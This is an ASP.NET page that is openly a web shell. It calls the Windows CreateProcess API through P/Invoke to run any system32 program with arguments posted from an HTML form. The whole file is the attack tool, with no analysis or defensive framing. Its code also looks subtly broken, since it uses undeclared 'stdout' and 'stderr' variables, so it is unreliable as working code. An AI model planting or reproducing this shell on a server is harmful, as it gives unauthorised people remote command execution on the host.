<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
//<%@ Import Namespace="System.IO" %>
<html>
 <script runat="server" language="c#">
     public struct PROCESS_INFORMATION
     {
         public IntPtr hProcess;
         public IntPtr hThread;
         public uint dwProcessId;
         public uint dwThreadId;
     }
     public struct STARTUPINFO
     {
         public uint cb;
         public string lpReserved;
         public string lpDesktop;
         public string lpTitle;
         public uint dwX;
         public uint dwY;
         public uint dwXSize;
         public uint dwYSize;
         public uint dwXCountChars;
         public uint dwYCountChars;
         public uint dwFillAttribute;
         public uint dwFlags;
         public short wShowWindow;
         public short cbReserved2;
         public IntPtr lpReserved2;
         public IntPtr hStdInput;
         public IntPtr hStdOutput;
         public IntPtr hStdError;
     }
     public struct SECURITY_ATTRIBUTES
     {
         public int length;
         public IntPtr lpSecurityDescriptor;
         public bool bInheritHandle;
     }
     [DllImport("Kernel32.dll")]
     private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
     PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
     STARTUPINFO si = new STARTUPINFO();
     protected void Page_Load(object sender, EventArgs e)
     {
         if ( !String.IsNullOrEmpty(Request.Form["c"]))
         {
             try
             {
            
                 string command =  @Request.Form["c"].ToString();
                 string args = @Request.Form["args"].ToString();
                 string lpApplicationName =  @"C:\\windows\\system32\\" +  @command;
                 Boolean bRet = CreateProcess(lpApplicationName, args, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi);
              Response.Write("foo" + bRet);

             }

             catch (Exception ex)
             {
                 stdout += ex.ToString();
             }
         }
     }

 </script>
<head><title>WebShell which uses Createprocess</title></head>
<body onload="document.shell.c.focus()">
<form method="post" name="shell" runat="server">
Command to execute <input type="text" name="c" id="cmd"/><br/>
Arguments if any <input type="text" name="args"/>
<input type="submit"><br/>
Output:<br/>
<pre><% = stdout.Replace("<", "&lt;") %></pre>
<br/>
<br/>
<br/>
Error:<br/>
<pre><% = stderr.Replace("<", "&lt;") %></pre>
</form>
</body>
</html>
